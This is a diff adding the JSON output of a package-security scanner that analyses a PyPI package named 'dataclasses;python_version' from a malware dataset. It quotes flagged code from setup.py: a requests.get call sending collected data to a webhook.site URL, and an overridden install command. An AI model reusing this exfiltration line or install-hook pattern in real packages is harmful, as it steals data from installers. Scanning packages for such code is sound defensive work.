@@ -1,0 +1,36 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": [
+            {
+                "location": "setup.py:16",
+                "code": "        requests.get(\"https://webhook.site/284099f8-6eea-45be-9c3c-3b6b0f9ccb0e\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:16",
+                "code": "        requests.get(\"https://webhook.site/284099f8-6eea-45be-9c3c-3b6b0f9ccb0e\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:19",
+                "code": "setup(name='dataclasses;python_version', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "code-execution": {},
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/dataclasses;python_version-1.0.0"
+}
